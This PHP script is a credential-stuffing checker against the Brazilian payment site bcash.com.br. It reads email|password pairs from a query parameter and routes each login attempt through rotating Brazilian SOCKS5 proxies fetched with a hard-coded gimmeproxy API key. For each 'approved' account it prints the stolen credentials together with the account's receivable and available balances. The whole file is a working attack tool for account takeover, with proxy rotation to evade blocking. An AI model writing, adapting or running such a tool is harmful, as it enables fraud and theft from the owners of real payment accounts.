<?php
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }
error_reporting(0);

function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
    curl_close($ch);
}



function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}


function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}



date_default_timezone_set('America/Sao_Paulo');
extract($_GET);
$lista = str_replace(" " , "", $lista);
$valor = 0;

for ($i=0; $i < count($lista) ; $i++) { 

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];


$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.bcash.com.br/login/acessar/");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/bcash.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/bcash.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'login='.$email.'&senha='.$senha.'&btnLogin=');
$d2 = curl_exec($ch);
 
    if ($d2) {
        if (stristr($d2,'Conta Pessoal') !== false) {
         
            $receber = getStr($d2,'<span class="total-sales">','</span>');
            $disponivel = getStr($d2,'<span class="total-receber">','</span>');

             echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email.'|'.$senha.' Informaçoes |</br> Receber: '.$receber.'| Saldo disponivel: '.$disponivel.'</span> <br>';
             
        }else {
            $valor += $i;
            echo '<span class="label label-danger">Creditos: '.$_SESSION["usuario"].' #Reprovada '. $email .' | '. $senha .' |  #SH4DOWD3V-SH3CK3R<br></span>';


        }


    }

   
}
?>